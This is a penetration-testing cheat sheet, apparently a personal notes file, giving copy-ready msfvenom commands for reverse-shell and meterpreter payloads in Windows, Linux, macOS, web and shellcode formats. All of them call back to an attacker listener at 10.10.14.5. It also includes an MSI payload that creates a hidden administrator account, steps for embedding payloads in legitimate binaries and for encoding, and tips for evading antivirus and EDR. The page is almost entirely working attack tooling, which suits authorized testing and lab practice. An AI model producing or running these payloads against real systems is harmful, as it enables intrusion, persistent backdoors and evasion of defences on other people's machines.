---
tags: [pentest, msfvenom, payloads, shellcode, initial-access]
tool: msfvenom
phase: 5
---
# msfvenom Payload Cookbook

Generates payloads in any format. The "swiss army knife" for shells.

[[06 - Gaining Access/00 - README|Folder index]]

## Skeleton

```bash
msfvenom -p <payload> LHOST=<ip> LPORT=<port> [opts] -f <format> -o <file>
```

| Flag | Meaning |
| --- | --- |
| `-p` | payload |
| `-f` | output format (exe, elf, dll, msi, raw, php, asp, aspx, war, jsp, c, python, etc.) |
| `-o file` | output file |
| `-e encoder` | encode (e.g. `x86/shikata_ga_nai`) |
| `-i N` | iterations |
| `-x template.exe` | embed in legit binary |
| `-k` | keep template's behavior + add payload |
| `-b "\x00\x0a"` | bad chars to avoid |
| `--platform <p>` | force platform |
| `--arch <a>` | force arch |
| `-l payloads` | list options |

## List what's available

```bash
msfvenom -l payloads | grep meterpreter | head
msfvenom -l formats
msfvenom -l encoders
msfvenom -l platforms
```

## Recipes by platform / format

### Windows EXE - meterpreter (x64)

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe
```

### Windows EXE - meterpreter (x86)

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell32.exe
```

### Windows EXE - vanilla shell (no meterpreter)

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o cmd.exe
```

### Windows DLL

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f dll -o shell.dll
# Use with rundll32.exe shell.dll,DllRegisterServer
```

### Windows MSI (great for AlwaysInstallElevated)

```bash
msfvenom -p windows/x64/exec CMD="net user backdoor P@ss123 /add && net localgroup administrators backdoor /add" -f msi -o evil.msi
# msiexec /quiet /i evil.msi
```

### Windows Service EXE (for sc create misconfigs)

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe-service -o svc.exe
```

### Linux ELF (x64)

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf
chmod +x shell.elf
```

### Linux ELF - meterpreter

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o mshell.elf
```

### Linux bash one-liner

```bash
msfvenom -p cmd/unix/reverse_bash LHOST=10.10.14.5 LPORT=4444
# Drop the output into any RCE
```

### macOS Mach-O

```bash
msfvenom -p osx/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f macho -o mac.bin
```

### PHP

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.php
# Manually prepend <?php  and remove the trailing newline if it bothers your upload
sed -i 's:^/\*<?php /\*\*/ :<?php :' shell.php
```

### ASP / ASPX

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f asp -o shell.asp
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f aspx -o shell.aspx
```

### Java JSP

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.jsp
```

### Java WAR (Tomcat manager deploy)

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o shell.war
# See [[39 - Tomcat Manager Exploit Chain]]
```

### Python / Perl / Ruby

```bash
msfvenom -p cmd/unix/reverse_python LHOST=10.10.14.5 LPORT=4444
msfvenom -p cmd/unix/reverse_perl LHOST=10.10.14.5 LPORT=4444
msfvenom -p cmd/unix/reverse_ruby LHOST=10.10.14.5 LPORT=4444
```

### PowerShell raw (for IEX execution)

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f psh-cmd
# Multi-line PowerShell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f psh -o shell.ps1
```

### Shellcode (raw bytes for buffer overflows / custom loaders)

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o sc.bin
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f c -b "\x00\x0a\x0d" -o sc.c
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f python > sc.py
```

## Encoding (AV evasion - minimal; modern AV bypasses easily)

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -e x86/shikata_ga_nai -i 10 -f exe -o shell_encoded.exe
```

> [!note] Encoding ≠ AV bypass
> Modern AV/EDR signature-detects Metasploit shellcode in any form. For real evasion, use custom loaders (Donut, Nim/Rust loaders, direct syscalls). msfvenom encoding only defeats the most basic signature checks.

## Matching listener

```text
msf6> use exploit/multi/handler
msf6> set PAYLOAD <same payload as msfvenom -p>
msf6> set LHOST <same>
msf6> set LPORT <same>
msf6> run -j
```

Or use `nc -lvnp <LPORT>` for the non-meterpreter `..._reverse_tcp` ("staged shell").

## When you see X, do Y

| Symptom | Action |
| --- | --- |
| Payload runs, no callback | LHOST wrong, firewall blocking outbound, payload arch mismatch (x86 binary on x64-only system, or vice versa). |
| Callback connects, then drops | AV / EDR killing process. `migrate` to long-lived PID inside meterpreter. Or use staged → stageless. |
| `LHOST=tun0` doesn't resolve | Use the IP directly: `LHOST=$(ip -4 addr show tun0 \| awk '/inet/{print $2}' \| cut -d/ -f1)`. |
| Target only allows certain ports outbound | Try LPORT 53, 80, 443. `set LPORT 443`. |
| Binary won't execute on target | Check arch: `file shell.exe`. Generate matching `-a x86` / `-a x64`. |

> [!tip] Stageless vs. staged
> `windows/x64/meterpreter/reverse_tcp` = staged (small initial shellcode pulls stage from your handler).
> `windows/x64/meterpreter_reverse_tcp` (no slash before "reverse") = stageless (entire payload in one shot, larger file).
> Use stageless when working through funky proxies or AV that flags the stager.
